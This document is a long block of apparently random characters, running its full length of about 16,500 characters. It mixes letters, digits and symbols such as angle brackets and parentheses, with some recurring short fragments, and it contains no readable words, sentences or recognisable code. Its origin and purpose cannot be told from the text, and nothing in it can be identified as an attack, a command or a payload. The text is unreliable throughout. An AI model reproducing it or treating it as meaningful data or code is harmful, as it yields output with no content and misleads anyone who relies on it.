UIr6rvcUt(1I8t4 1Z(1UtSSv-vv8 cjDI1>vS>Iv>S-H84^1  gII->U( 4U>4-1v>SUcc -4D1vU-cD UUUSL vr 1!Iv1ct1cI(trtIv>SS884t>Sr8SuvI 4vI8>r-4v>(c4Ivc42SUtIIt8IIII8r(UWcU(14>DU1IDttSv8 8r4I3t(ct tt SD 4r11>4vIct-S88144IUtDU(8D(S-cv%m4I1>>-UvS(v  D2U<v1(>4U;>Ivc  >44D1U>t>tUcI Sr-18->cr811US-SS-IIS-14 (1>U( > -c84O1I>rD4S>cUtv4>4-rv>(U4S  4-1-(4r8D>UUcS-vc4 (#-1(t1SD1t1 t>D8DI>DSvI)-S3vID>_S481c-8tiI4 >DUvc8(pIrvU c4vD UiD -Ic4(tIUDtUrcr8 r(trt4cD8 ,SSw8tr11>tU>tt1S884.cI(UI-U8-(D4Bvf( I1>>-U>I-cvr(cU(>>  >vDc>-v>1v 1 SU>cU S0S8rt2c4 1r41UtSSvc vc14t1S>8UiSr8> U AvT1ID>Ut-vv( 4H1%t-v>(>4S1cU cg(4r4I-UUct v0(15U4c181wD1StUS v-r411t>->v89vI->dtv81d>IUDU-Iv (SI4D-->vU(SrS1IUYcc(14rDUUScv8vvIDrtvc>8(rS1vt - v r1I8tUU88v< IbDw--8>( ISD!- v^G444D8-Uc((v4tDa-4v1 1rDDStoc 8-44D1U>cUv8rv1 tMS> 1r11UDSDt8 =(14t1S>v1pS4SD8-Rv3Q1rr>U-Svv8 4U>4-4v>(>4SIvU -& v41D1UUcU viD1H>4S( >r>1StSS v6r441D SU8U_vIv>2-S81 >I>>S-Sv ( I41Q->vU-v4cD8U_vr(141DU>Stt  r(D4UIc>v>rSI 11Sp8#r14ctUS-8vR8Iu> D>8D_UISDr- v(O44*rU-tvS(vvUD_-rv1 1ScDSUcc vc44D1U>-UDvrv18t.cr 1(>1UDS-18 G(14tIS>c(*SrvDD-M8rk1ID>UUSvv8 4c>4-Iv>(t4SD1U S  U41D1UUc> vr 1F>4SU >r>1StSS vrr4I4trSU8t;vr8>pS481(1t4>S-Uv  (I4>1->c>  4vD-U#cI(14>DUtUS-  rSD4>8c> UrSIS>ISN8cr1rNtUSS8v(v4 t4-v8>(8IS>v- c (4I1D8-UvD(v4 D=tTSt(>r DSUIc  !4414cvcU8(rvIrtfc4 1e1t tS-!8 =114t1S>v>4(Iv>r-pvc*1I>>UUUct( 44>4t8v>(U4SDvtJc2 W411UUUcU vf 1vU4cI >r11StSS 87(611tDSU8SivI8>oS4v-d>I>>S-vv ( I4>1-1vU(t4vD UAc=(1(>rvU-c-  rID4D/c>cU 41ctcSdv1r1I1tU-S8D; I t4-c8>{DISIv-UvA(GI11v-Uv1(vr Dv-4vI(>r(DSUSc 8 r8D1U1cUvDrv1 ta-48Ur>1>tSSS8 (U14>4U88Up>IvDk-i84n1I>>(-SvS( 4v>4-4v>8Ur1DvUvcu i41DIUUSU-4r 1vU4-U >rU1Stv-D8zJQ11t4SU8UEvr >SS484C>I>>S--v   r8>1-4vU8t4vD Uzv48v4>D>UScU  r D4>1S  UrU1vtvSQv8r1I1DvSS8U* I>t4S18>dUD1>v--v;orI1>>-UvS >4 Dv-4c((>4UDSUvSI #riD1U>cU -rv1 tIc4 4r>1UtSSc8 AX4Ut1SI8UiSIv>v-W84(cI>>1-Svv( 4 >4>1cc(U4>DvUrc/v 414>1}c- Ur I4U4S4 >sU1-tvSc8=_-11t4SUSS(1I >8S4cSJ>It>SUvv8(T4=>1U8vU(t4v1vU v4(r4>IIUScv  (V1IU1cI Urt1v>>SKvWV-1>tISSv : I_t4S188iUIt>v--v*(hI11>t(vS(-4 D8-4vr(>r>(.Uvc- LC>D1U>cU S(?1 t8c48(r>1>tSUvvDL,I(t1SI8UltIvDvUt84((I>1D-Svv( 4:1c-1vI(U4DDvUvcL844rD>UDcS -r IcU4S48>rU1DtvS18sr411t>v 8S/>I > S481:>IUU>-vv-(R4v>1->vU(S:(D U8v4(14>DtUSSS8>rB1(U1-r UrS1vD -( 4rr1>tDSScv3 r%D S18IxUIt>vUDvY 4I4>>-DvS(-4 1)-4S1 a4UDtUvcc T0(D1>>SU Sr-1 t8c4v r>1U> Sv8c.GI;t1SD8U%>  >8-;84-cI>>t-ScSUr4l>r-1Sc(U4SDvU  >(444D>UUcS vr 1at>c1 DrU1UtvS88fr48vt>SU8S0cI >5S481{>IU>S-vc((VI4>1->ce(S4vD 1tD1Urc4(trvD-U-rP1tU1c> Uv 88rc1(t>v18SrtIrtt-vIN>cS18>dU81(S4(>IS< 841-Uvr(v4 Dw1(Dv-Dc>(-4-1SUcS_DrU>cU Srv1 tz>1S1r>IStSSv8 vS8-h>14-4SrvS(c4vU(-vv8(vI>vv(S4C>4-11(-tvr UU c8(441D>rSDDtDrc1*U4c1 >rUlS4U> 8H?>11t>SUUc-tvSX1I->>Sr(D(c4pD(U I4Dc->vU(S 1(D4-DSUUc8(r441U  rSD4U1c>-Uc-8Sr-14> r1I8tUSS8vvU8tb>IU-I--v (84vvN(vI1>>-UUtU8v4(rr3-r(I4UDSUvc  <14 D1>U8 Srv1 > ID 1r>1UtISv8 YP14ScS>8UMSIc> - 84( 1(>U-Svv(-4u>r-1vD(U4>K U8ci(4r(D>UtcS Uvl1(U4c1cvrU1-tvS U4r411t>SU8S^vI >l8-812>IU>--vvv(&4vt8->vU(S44D U(v4(I4>D1Ivcc  r#1UU1cD Ur>( t8SJ 4r11>ttSS8vSsIHt4S18DLUIS>vt cc9rI1>>-UvS(S4 I5U v1(>4UDSUvcS K?41DU>cU Srv1 tSc484(R1UtUSv8Iy^14t1S>vUdSIv> - 84M4I>>4-Dvv( 4+1(-1vD(U4SDvUSt4(r41D>tDcS cr 1vI1cI >rU1StvS88k(hvtt>SU8SGcI >yS4c1vrIU>S-vv ({4S>1U1( (S4cD UDv4(14>DU4tcc  rs12U1c1 U,UI(t S( 4o>1>tUSScv(-IZtrS18D%UIt>vUvvrJ4I4>>U(vS(v4 1 USv1(I4U1cUvc  ^^}1cU>c1 Srt1 t9c4 1(S1Ut-Sv8SykI)t1->vU.SIv> -I84VII>D>r8vv(84hD1-1v>(UoSDtU c((44ID>UDcS8Swc19tsc188rU1Stv-vvur41rt>--8SsvI D UD81O4IU>D-vv (xI4D4->vt(S4UD U v4 1-!DUUScv 1rWDrU1c>8trS1ct S( 4r11>DU-(8vE8I!trS181.UrSD - v(,4II>>-1vS v4rDp-4v1 S4UD-UvcS (44D1U>cU Src1 t61S 1r>1Ut-Sv8 eP14t1S>8U{SI1> -G84y1I4>U-Svv-tv((D4(v>(r4SDvU D-U8S< (4I1vt>r 1SU4c1 >8D8c? 1UttSc1rt>SUUv(>rD14vD-4J>I1>S-vv U-8r(c44vU(D4vD UdD4-rvD vr cv tr+D4U1>>tvc- -r->tt r1IvtUSS8vv8vc( IDc>vtvU)I4c>c  I1>>-UcUt(4 Dx-4c((>4UDSUv(D ;44D1UDcU Urv1UStc4 1r>IDtSSc8 KR14>^DU8twSIvDc-,8r7141 c-Svv( 4 >4-1v>(U>rDvU cT(r41D1UU-SStr 13U4c1 >rD1SDv>-8Ar411t>SU84uvIUU-S481M>48>S-cv ((I4DY1Uvt(S4vDIU)vr(144_SU-cv  rnD4UIc>8>-81vt Sw rr11>tUUS-t0 I/t4S18><rIS1>-8v{74I1>>-Uv-(v4SDwU t>(D4UDSUvc  (4414z-cU Srv1Ut3c4 1r17etSSc8 jn14t1S>8U( Iv> -Jv0n1ID>U->t (84T>4-1v>(t4SDv4>cy(441DDUUcS vr 1(U4c1 >xU1StvS 8l,-11t>SUtcS8(-B4I8>t-88I(t-vvU(CI4>1It>-S8vc(D44c((14>DUUScvU14Ur4U1S8 UrS1v:t1r>}S-8I?U1-t-S-I2D(S18>LU81bI4v>c-4v4(trp>rU(vD vr-D1U1c- 8rv1S wr4D1U>cUS4St rr(11tDS8 14UI8>(-v(4rII1>1dS46> -b84cr8r(1D-DUUSc (-I4DrU1vDDvUIcE(441d(4I1>S-c> tr>1,t1cI8vtv--8}r4114-1t>4vc8c(vI-D SDv1Rr48D#cvv-(r44>tUvv-(-UEcv(14>DU4r1vU8ct8errc>88rS1vt >(>_Sc8IrIDS>S-(8I244)8>)1IS>v- >-Srvt9r-Uv1(v4 DO1(DUU8vI vrUc  844D1U>>(tt8c1 tcc4 1r>(cFc1Ut-S114>>S>8U^S(>jDI4> c v8(>4tDUccvU(-4U>48I4SDvU S Dc41D>UUSz vr 1Y>CSI >rt1S>QS 8Er441DSSU8-bvI8>)- 81 >4c>S-cv ((I4>4->SU854vD8Uivr(14DDU>SSD  r(D4UIc>8crS4v>rS5 rr11DtUS48vF rUt4SI8>,>IS>v- v) tI1>>-UvS(v4vD:U t>(D4UDS>Sc  (44I1t>cU Drv1St)S1 1i1t tSSD8 2r14t1S>8U(rIv>--evc_1I1>U-1 D( 4c>4U1v>(t4SDcU cvS14ID>UUSS vr81Wt >> DrU1SDSS 8(r441>>SU8DGvIS>N-481(1> >S-Dv (SI4>1->vU r4vD-UWcc(141DUU1U+  rSD4>vc> trS1tt Sv-1rI1>tU-48v=8I.D4-18>Z4IS>t- cy5444-v-Uv4(v4IDC-4v1(>K(DSU>c  U44D4U>c4#Irv1UtF-t 1rD1Ut-Sv8Sv41rt1S>c8.SIc> -vU1^II>>UtUvv(84&14U1v>(r4SD>U c-(4r4 4UUcr vrD1QU4c181.r1St4S 88r411t>SU840vIt><-U81eDIUDUUDv (-I4D(->vU(S4v14U=cS(1rfDUUScv  *-D4t8c> >rS1ct SSv)r11>tU-u8v}8I5>0S184cSI->v- v>V4II>>-U>4(v4 D6-rv1(>4UDSUvc  n441vU>cU Srv1tt_c4 1S( Ix>1Dt-S4vvt1-V8UCSIv4cIr>1- v86r-SvU( 4*>4IS>rU>vDDvUDcH(441rDrI1>t8( YS4r14t-rU1>tvS 8?-c IM8I18S;tI >LS4>1SI8t( 4Pv ( I4>1->>-cI4v1VUnv4(18I(Ir DtUcSvI4It1ttSSt8Ur-I v8r11>tU-UD(* Ilt4-(8>2UIS>v8Dv!64I1>D-UvU(v4UUt-4v1(>r1DSUcc  w441%IUct SrvIStscr 1_1vctSSv8 Q(14t1S>8U1rIv> -J8r<1I1>UtSUt( 4N>4-1v>(>4SIv1-c6(441D>UUc> vrU>-U4c1 >H81StcS 8(r4Ie4USt8SnvII>GSr81i4 S>--vv (6I4>I->c>t84vD Uhcc(14>DU>Stt  rfD4U1c>8wrS4> 4S! 4r11>tUS-8vKcIm> D>8DKUIS>v- v(p444 --UvS(v4UDW-4v1 _((D-Ucc  ^44DIU>ct Srv->tbc4 1r>1UtSSv8 o114t1S>8>^SIc> -vU10II>>U-Svv(84)>44vv>(U4SDcU c;(441DDUUcS v (1{U4c1 >0S1StvS U8S88Urr1D>> v(rgrI1>r-48I(U-vvS(7I4>114>IU4cUDcU3v4(14>DUISIUS r8D4U1c> UrS1vU tr 4.81>tUSSUvS48((-I(>1-DIS>I- vhP4(I(r41Dc8v U((r<Dt(>r(DSUvc t-cI 4rc1DtScc crcS(v1->r--S v vv_W4t1Sr8UiSIv4rIr> -(vS>U-rvv( 4GrDIID(USvr Ur-DvU8411UUUcS v8U tr11A-.S(8Ux-IS-8SS8cAS118S(vI >yS4Uv-rvcF-4 D(-tv r44tD-U>8v(8r 1 (1rcDUUScvS4cr (4I1S-US  cwD1c>gr1I8tUSS8vv>8crrIU>4-k(UVc4vv84UID1S8Uv>rID-Sr-4v4(>4UDS48tt Gr(D1U>cUSrS-F8t*Sv 1r>1UItI8>=SS8-C8S>8IpSIv> 4^tr-cv1(D-Sv>( 4#>4Drt5U>v- (4-c? e41D>UU>>-vr 1-U4c1 >8I8vrc1vt1S88Tt>S48SHvI 48I>>cSrvS(>-vv-(}I4>114D(U>c:(-Ulc (14>DU4zDttvccD4t8c> UrS(>r-18> SD811DS-8v_ IUt4S18>cUvc(-IDDv--vD(U-D>-hFI8SrrS8KD1>SDSUIc  w44rrr DttUcc c2v18t4rII)I tvD rh8 &v>>8U2>Iv> -GUDSIv8(S-tr8rr(cX4-cU(1Q vD-c1vr8>>1D4-( DS8rc-1D?cv?t1>tSv-  88ItS>1rUU>r4U-vc4-(81N>IU>S-vv (x(4>1-4vU(S4v(t4(DDU(4>DrUScv  c- 8NO1(UISv8>t Sv 4r11>ur1-tI-SI8UUrccUSUI DvS9-rA4Ir>>-UvSU v- --4ca(>4UDSI-DDt>c8D1tocU Srv (4r>DUIS88SttI8(tII1IUDr>14vvIv>I-<84n1 (EI4>U-->vt(>4RD1-IcvDvUDcy(441(t4-tDt c- Ir-1(tIcc1StvS v tc11t>SUvtnvI >RUZv1#>It>St>v (gI411-1vU(-4vD8Uhcc(12>DIUScc  r(D4DUc>vUr-1vt8SZ rr1rttUUSvce I(t4SI8>(rIS1vU4vTHrI1>D-U-v(v4 IU-4vI(>4>DSUvc  5AtD1U>cU Srv1vt)S ->rD1UtSD48 o(14D1->8UpDIv>S-dvrX141- -SvD( 4t>4-1v>(UrrDvU-c0 c41D1UUc1mDr 1cU4S1 >rt1StcS 8vv11It>SUvS+vI8>k- U>lDIU>S14v ((I411U>vU(D4vDSUOct(1r1U UScD  r4D4U1c> U5r1vt-Sj8cr111tUS1hI< Ict41S8>WtIS>v- vvc1II>>-U>A(v48D?t4t((>4IDSUUc  444I1FIcU Drv1-tm-4 1(>I tSSt8 ec14DvS>cU(>Iv>--Wv8H1I1>UUUct( 4S>4t(v>(U4S1Strc. c4114UUcS v( I(U4S8 >rr1SD4S v (>11> SUccMvI >uUY_ 7>4(>S-1v (kI4D4UkvU <4vIcUwv4(1r1IOUScr  (tD4U1c>8>^c1vt4Suvrr11>tU-U8t; IIt4U48>CUISDSU8v?(1I11--UvS(vrv1t-4cD(>41DSUvc 8 DUD1t>cUv>rv1 tE-5rSr>IttS-88 bi14>4tr8U(UIv1r-j84y141D(-Sc-( *t>4-1v>(UrIDvUtc38(41D>UUcS84r 1SU4c1 >rt1SD>-v8;78111-SU8-pv4D>L- U>?DIU>S>(v ((I4D,1Uvt(S4vC1UYvr(1W>rIUSc>  rvD4tUc>vU(-1ctUSA8vr1rctU-Uv1j I-t4US8>GUIS1vUUvO(cI1D(-U-L(vrv11-4cv(>BIDSUvc 8 NDD1t8cUvDrv1 t;-:vtr>I tSSU8 H<14t1Sr8U?IIv>1-Ov%E14,r>--v>( 8>>4-Iv>(r4SDUI;c((441(vUUc- v( icU4S  >r11S>zS c!c811>hSU81av44>/U)cUe>Ir>St>v (OI411UrvU(I4vDtUXc8(1*>DIUScD  r-D4ttc>vUM 1vttSO8cr14UtUUSc(, I-t4-88>(vIS1vUcvT(cI1D(-US (v4 04-rc (>44DSUDc vx88D1tKcU 1rv11t!Uvc1rD14tSD48 6(14trS>81cvIc> -htU{1ID>UUU1(( 4S>4>vv>(U4SDv1tc( v41DDUUc- vnv1DU4S  >VI1StvS ci( 11>(SU8>hvI4>GU4c8<>Ir>S-Dv  vI4>1tvvU(44vD Udv4(14>D4UScD  r-D4tvc> U((1vtUSO8dr11DtU-U--!8ISt4t88>HUIS>v-vv?(vI1>D-UvU(v& DI-4c (>44DStSc vs_tD1ticU 1rv1UtfSvv-r>14tSD48 W(14t1S>81cvIc> -?tUb1ID>UUU1(( 4S>4U1v>(U4SIv1-c2 v4115UUc- v(Uc1U4S  >c 1StcS vtr4I/4USt8Sdv 1>OSr81 >(I>S->v (vI4D>->SUcD4vDUUAcv(1Y_DU>1cc  rSD44Sc> trSIrt Sv-1rI1>tU1u8vh8IN> D>8D}UIS4-- v(!44 D1-UvS(v41Dh-rv1(14UD>I c8 ,441SU>ct Srv >t9c4 1rD1UtSSv8 7614t1S>84hSIv> -{v4)1I>>UD-DtUSvr141 >DU>c8Iv1vDrt(cr(rrDcS >r 1;U4>t>8vS -z(1-8eyc11t>SUtIStvS!-I8>>UuIUDv-vv (u88(1I4>tU>vt((I8D8tfc4 (rvDD  rtD4U1c>-DS>88p Dv>cS( rgSSS8>z Izt4>r>t-S81*IItc*a4I1>>U>>1(c48D=U(v1(>4UDSt8c  (44DIU>c> S(v1tt*cr 1rD1Ut1Svv ^t14tIS>8t,SIv> U vST1ID>U->vv( 4H1xUUv>(>4SD-U c5(4411IUUcU vr816tVc1v>8I1StSS 8 r414t>SUt;JcI8>z-X817DIUDUU-v ((I4D(->vU(SrSIUU(cl(14IDUUScv  i8D4U4c> trS1St U)8Ur111tUSU8vKUI3D4U(8>M>IS>S- v(N4I1>D-Uv-(v4vDi-rv1(>rvDSUvc  (44D1U>ct Srv1 t!SS 1r>1UtS- 8 Ra144r1r>vSD8-(StEUD-DvU(D4>>tUv4.D--1v>(U - trSDr848 (Dr>18 vrS1:U4c1>(ct rbUS 8Sr411t>>D>c- 8UHtIc81((IU>S-v>t-cc (8IrDSU14vDvU_v4(1vtrrUScD  rbD4Ir1tt>S>8trS1r 4X(1>tUSS>vSc8(j>IUvrlUIS>vUvDIs4I1>>-DvS(v4 Dfv-v1(>4UD-Uvcv RrvtcU>cU SgU1 t(c4 1r>114vSc8 Xd4 t1SD8U(Uc(> -684((I>>U-SvvID4T>4-1vD(U4UDv> tc(441D>UUcS Ur 4^I8c1 >rU1StvSv8A/v>ct>SU8SCvI >(S481w>I1rv-cv (5I4>1-DvU US(D Uiv4  4>DUUS-vS-rOD4U1c> Ur-1vDUS( 4r11>>-SS8cx I-t4-=UUZtIS>vU(vi_rI1>41Sv-(v4 D2-4vI(>r>88Uvc  LrSD1U>cU 1(I18t(c4 1r>1ttSSc8 yeUSt1S>8UmSIv> -684(UI>>U-SvS( 4(>4UMtU(t4SDvU cw(r41D>rycS vr 1(U4c1 >rU1-tvS 8p I11t>SU8SNII >mS4-I-rv1(ctvUU-(c_(t->v1(S4vD r->rUcc4DUUUcv  r}( I1c>88rS1vt >-t8-}mIfm1r>WSSv X8I>8I( t4Utc(-(4(1c4t-tvS(v4tDN-4v1SIc- UrU1-UvcID1U4cU Srv(crtIUt(r>14tSSv8 cr I4t1D>(-vI-> -;84=1I>rUr>Uv( 4S>4-1v>cD 1 S48DIU84rcII4cr>vU>>t8P(> I4r  tcv S84D%4I>SU8I=vI ><1v>(SIv1(c4S-c(p4c>1->vUSSc6(8rtD8U4cIDUUIcv  rLP8r>DDU>S  trSS28vr11>tU>t>7SD8cO14d8I( t4Utc(-(4(1cSt-Uv>(v4 D!1D>IU8cSDtv8S>IIvI8sSr8>4crv1Dtyc4 1ct -IDI t-SI8-h(II8UkrIv> -xU(-v8D(>I->-USvc b-1c8(U4SDvrtDrtXc- IrUD-U-c-1Wt1c1 >rUe1rIIhtvvv8ch1ID>>v-8>utI>>gwIvrSvv4v(S8v1cS8UvU(>4vD U6Dc-Ic-(IUSct  rTD44l18t1S  ttcSK 4r11>tUSS vv(I84-v8US1S>rSS14U2344B>>-UvSSUv- Ur v1  4UDSUv> UrS( cr41(tcS 1 ttc4 1r>(cr-1D>ZStv ((14tIzSI>> -J84vrvt(SI1>I-t48SI8D--tU-rtI vU4(4r1D>UUcSS1S- I4r1>ttS( >4SI(tr- (1rDI>>>y-I >PS4813>IU>SDvv (-I4>1->>r-DcU(t4cD1t 4>DIUScv  SA(rrc11tDrSI t SB 4vr rBv1Dt--Sra4DID>U-Dv>bt4vvA((I1>>-UUrU- 8D8 >rtr v-(1Iry8S744D4U>cU Sc8yttuS8 1r>1U48I8tSSc8>trIvvprrIvI>I(D41>I>D(-Svv(  U(8IIDSU1v4rS481 (44rD>UUcSt c-8-U4S- >rU1S4fI(t8cr8U4>Ivt--I8-( 1I81z>IUDUxDv (WI4I ->vU(SrSDvUmvr(1JvDUUScvv r>D4UIc> trSIDt UFv>r11DtUS-8v+DI<D4-(8>,tIS>c- ccR4r1D3-Uv-(v48D/Urv18>JvDSUcc  (441TU>cUv4rv18tgS6 1r>1UtS-r8 B&14t1S>8>NSIUr9-(84)18S>U--vv8 ra>4U(v>(14SI1U S 4U411(UUU( vr 12U4-c >rI1StDS 8 r4I U(SU8D?v4 >ESr81#DIU>>1 v8(*I4D1->vt(S4UJeU(v4(1vSDUU-cvv 2#D4t(c> 1rSI1t - rUr1I(tUt88va I0t4Uc8>hIIS>D- v N44 t(-UvD(vrUDB-rv1(D4UD>I c8 h44I U>ct SrU(jt(c4 1cS1Ut-Svc vc14>(S>81%S,(> tb1(G1Ir>U-Dvv c4714Urv>(I4SDtU SD(4i11 UUcD vr-1X>1c181(81St>S 88r411t>->vv=vIt>+-t81{>IU1SUSv (-I4D8->-S(SrS1tUzcS(17-DUUScv8vDSD4tcc>8crS1vt - 8Ir1IvtUUr8vm IzDR-(8>(8ISDU- vwR444>D-Uc (v04Dz-4v1 1NcDSt(c 8 44D1U>S>8>rvI.tZUM 1r>1U>U-18 kr14DUS>8U&S4SS1-<v4L14S>U-Svv v>>>4UIv>(I4SDvU S c84111UUSr vr 1_>/cI >dD1S>US 8+r411>1SU8IFv4c>/S481R>ID>S->v (0I4>I->S4 U4vD-U_-1(14DDUUIcv S84DrU1c>cSrS1ct Sv-1rI1>tU1 8v_8IhD4D(8>j4IS>U- S8=4r11D-tv1(v4UDwUSv1 1r8DSUDc  444D1U>-U8 rv1ttFSc 1 U1U>USt8 uU141:S>8UlS4SD--5v-X1r4>U-Svv v4U>4USv>8v4SDvU cF88411(UUS_ vrv1}tv t >r41S1IS 8(r4I8t>S1Uv%cI >B>-81zDIU>>1 v8(HI4dU->vt(Sivr-Uhcv(144DU>tcvv vcD4t c> 4rS48t - v8r1I(tUUy8v+ IyD4Ut8>CrIS>D- vr#4r1>r-UvI(v4tD3>Iv18>r8DSUDc  -44I U>-U Drv1ttYSc 1(I1UDSS48 e-14>8S>c-!SIvh.-(vva14?>U-Ivv8  c>4U v>(44SIvU -S(D411nUUt1 vr81ptUc1 4vS1-tvS -Sr41It>S1Uv+cI >Y1>81GDIUDUr(v (SI4>4->vU(S4vrtU(cv(14DDUU-cv8vbDD4t c> DrS1vt UY8vr1I(tUS>8v cI?D4Ut8>0rIS>D- vD!4I1>I-Uv4(v4 Ds-4v1(>rvDSUDc  -441vU>cU 4rv1Ut<S= 1rD1U>U>-88#S141(S>8UPSIvDI-9vvg1ID>U-Uvv8 rv>4U v>(44SIcU -h D411uUUc1 vr81=tv-U >r41SrYS 8(r411t>S1UvFcI >Y1>819DIUDUr(v (SI4IS->vU(Slvr-Upcv(1rJDU>IcvvUU1D4t c>UvrS1ct S- 4V=(UttSS8vc4ITtrS1c>vIIS>>- vv%4Bt>>tUUD(v4UDgUvv1 >4UI1 yc  S44P U>ct Sr>1 tv>1 Ir>1UI1Sv88F{Iv>4S>8U=SI4> -(84:4I>>11vvc( 4<DU-1vD(U4S(1U cB(44ID>UUcS vr 1LU4c18 rU1StvS 8cr411t>IUttSc84e1S4v2)>IU>S4D>8-tc >1U(vU(S4v(t4c1 U8vr Sr1cv8Mr6D4U1>IUIS  trcIvv4vt8teSIt>US-v t4- 8>:UIS4-4(>4-vvc((-UvU(v4 D3IIt8(>r(DSUvc S(S88Yrt-US1cc8vrIc48 r>1UtS>UtDS(80%UItv1YSIv> U DDh1I>>U-Uvv( 4%>4vcv>(U4SDcU c (4r t8UUcS v_c1BUrc1 >rU1>4 S88fr4Irt>St8S(Svr>mS481&IIU>S-vv ItI4>1->vt(S4SD >&t8(14>DUUScv -r*I4I(c> UrS1vt S- 4K >8tUSS8v. IZtrS18>VUI>r -8vMQ4I1>>-tvS ScrD{-4v1 o4UDSUv- Sc44D1U>cU SrU1 DSr> 1r>1UtSSv88QgISt1S4USk-Iv> -i84,II>D>r8vv( 4T>r-1v>(U41IIU8c((441D>UtcS cr 1RvSc1 >rU1StvS 8gr4IUt>SU8SOSI >(S4vecUIt>S-vv (EIr>1->DN(S4vD U(v4(14>DUU-cv  r&4>U1c> UrSI t S: 4v 88%S1>->SDv ((4*-I-+8r(}ISv_(cI1>>-UUDU v8( 4>D(-44UDDUvc  *8D D44DIt rv1Stjc4 1S( tG81t8cIv1D>-U>U4(-DUS(-Fvce1I>>UII>tUSv-(84>1*(U4IDvU cX-vc((Ir11ctS c1FtSc1 >rU(S68Ictt- 8cktIS8t3vI >xS481M>IU4S-vvI(7I4>11SD--tvc(4I_D>-IS8(IrUcv Ir7D4U1>(UIS>?-r>1tt>SG81rIIv8vsUIdt4S1-I--vva>ID>-f44 >>-UvSc-v4(t48D>U44D(DvDtUvW11I +v(U Sr-1 tgc4t>cr8rtS-v8 ne144vIr>cS-v ((It> c4vt(-4>tv-8c   -1vr(U4SDvr D(U-c4 IUUcU vr 164I>8 It8r4vIv(S(v(-rI>SU81JvI >iD >cSD8>( 48v (tI4>1->UD-4vc v4(D(t?vr >UScU  r}D44/Dr>NS>1-U2r(.U-DDrUvv4-8) I4t4S18>cD8D(BI->8U r1r-4-DvU-cS(cr9vrdU-tta*8v-n1IS-DU>cr Srv1 451>UI-8 ITUI-8 + 14t1S>U1cSIv>D-_84A1c((-4U>rUcc.{rIr>r(U4>DvU c6tcvI 8r1c- vr 1SU4c1 >c- c4(18ttS111t4SU8Ssv(rY(I->>A>4(>S-vv cI8r(84UD(U>ct(S4cv4 c4>DUUStct-Sv I>1>mUtSU8(tcD>S1IU4tI(1r-Uv IA>-S18>&U8c&8D->4-8vt(8IIDt(v4cDa-4v1S8cDr-UvcU ?44D11It4tUcc rrcc48!r>1UtSD-tD->88trS>8UHSIv> -3 4vDII>U-Svv( 4{r4YuU>(U4DDvU cL- cc 4rvDD -r 12U4c1 >rU1StvS 8tr411t>D5tDSc84(vIS-4SDv>{8-vv (hr5v8->vU(SrcD UOv4 44IDUU-cv Sr2D4U1-> 4rS1ct S( 4(U1>DU-18v,8IRtrS1ct}UrS1n- v(s4II>>t1vS8v4>DO-rv1(D4U18Uv-  I44DIU>ct Srr1 tCUS 1rD1UtUSv8 Lw14D-S>8UCSIv> - 84(w U>t-SvvS14E>r-1S> U4SDtU cv(4((D>t> W vrt1kt(c1 >rU1S>IS 8cr4I8t>S>8Sd>>D>W-881SvIU>--vv (y4 r>-DvU(S84D U(v481r>DUUDcv Sr2DrU1S1r rS1Dt U1 4r11>tU-r8vx-Ix>cS181JUI1UD- vc^4r(>>-tvS(c4 Dv11vI(>4U1DUvc8 =r Y>UDcU Sv41 t(c4v18r1UtDSv8SHsr>t1U>DDhSIt> -c84 1I>1UU8vv(-4MD8-1-v(UHS1vU cc(4r(D>t4cS8S3S1Vtvc1vcrU1Stv-vv-r4I8t>U48S0vI 1&-D81((IU>I-vc((RrCD-->c.(Sr-D UMv4 4DEDUUrcvvcrOD4U1S1vvrS14t S4 4r11>>>U)8v7IIk>8S18>TU4U>-- v1m4&->>-UvS SrDD3UDv18(4UDSUvSv8(441>U>U8 Srv1 > S  1?t1UD4Sv8 s_4ZSSS>vU+Srr> -k84(4>v>UU-vv D4N>4-1c11r4S1SU -D(441D>t>Sy vTc1lt8c1 >rU1StSS 8-r4Irt>SU8SFvIS>W-v81&>IU>--vSU(II4D(->> (S4cD tvv4 08UDtUScv-1rjDrU1->SIrS1>t Sv 4.11>DUU-8c,UI6>vS1S(:U4U>c- v-w448>>-UvS8v4-DZUcv1 (4U1cUvSv81441vU>S( Srv1 > S8 1,81UtrSv8 Gz4_>US>v MSr1> -K84L14(>U-Ivv(14gDa-1cdS>4-D>U >>(44ID>UrcS UvT1(U4c1UvrU1-tvU -cr4I t>S18S(vI 1B1881(LIU>1-vv>(Hr.DD->vr(S4UD U:v481rvDUUIcv tr<IUU1-> 4rS1Dt S- 4gS1>DU-v8vRtIs>cS1vrBUrSDU- v-:448>>UUvS8vrcDRUcv1 (4UD4Uvc -44r1 U>c4 SrD1 Dx>8 1dZ1Ut1Svc8YFrvttS>84yS(-> -(848cI>>11vvc( 4gr(-1vD(U4>m U8cQ(4vSD>UtcS8SSr1Mtvc1v-rU1StvS --rrI t>St8SWcI D Uc81(+IU1(-vv (_r4D1->vr(S4UD tmv481r-DUUIcv tr{4vU1c>8>rS11t S6 4r11>tUSI8vBtIo>cS1v *UIS>U- vSu4I4>>-tvS S(DD{Uvv1 y4UDSUvc  1441 U>ct SrS1 D?-v 1fE1Ut1Sv84d,44DcS>843SI>> t 84( rc>U-1vvSv4&>r-1vD(U4>K U8c%(484D>UtcS Uv.1(U4c1UvrU1-tv-v>Ir4I t>->8S:vI 1yD881(:IU>1-vc>(W7vvU->v4(S84D U(v4854>D1Ivcc  r<(UU1cD U(Sytt SS 46{1>1vSScvv-I5>vS1v:wUIU>vtUI1%44 >>DDvS(c4 14-4cjSU4tDSUvtc F4rD1t2S> Srv1 t>c4 Ir>1>tSSUUl^(14t1-v8Uy-Iv> IU84&1I>>t-Svv( 4)>4-1v>(U44DvU cJ(4r1D>UUcSScS-8vrI-1-kct8UJ(U - SI8rzI1I>t5vIU>sS481vIv-(vI>>D--I4D(->vU(Scv(c4(D>UU4>DrUScv  c- 8ij1(UISv8>t SI 4r11>4D1D>FS-88( U1-1--vt(-I-D8*4I4>>-UvS-8 tD{USv1(>4UT84IDcUUc- UrSDI SrU1 t%c4>8cD8(F>-U8 QO14>44-8U:SIv>>-Z84h1I>-(-Svv( 4(>4-4v>(4DrDvU c!8(41DDUUcS vrS94Urc1 >;D1StcS v -D11t>SU8>7vI >^S4icC>IU>S-cv ( I411DrvU(S4vD U6cn(10>rIUScv  rFD4UIc> 41r1vt S^ 4r11DtUSS8vVS(4trS18>uUIS>c- c UDI1>>-Uv1(v4 Dyt4t((>4UDSUvc  c444  ScU Srv1 tFcr 1^(1Ut>D 88*!14t1S>8t0S4S(r-Z84,1II>U-Svv(U/t>r-Iv>(U4SDcU c((441- UUcS vr 1aU4c1 >ov1StvS 8 r41It>S1Uv6cI >CS481;DIU>SI1v 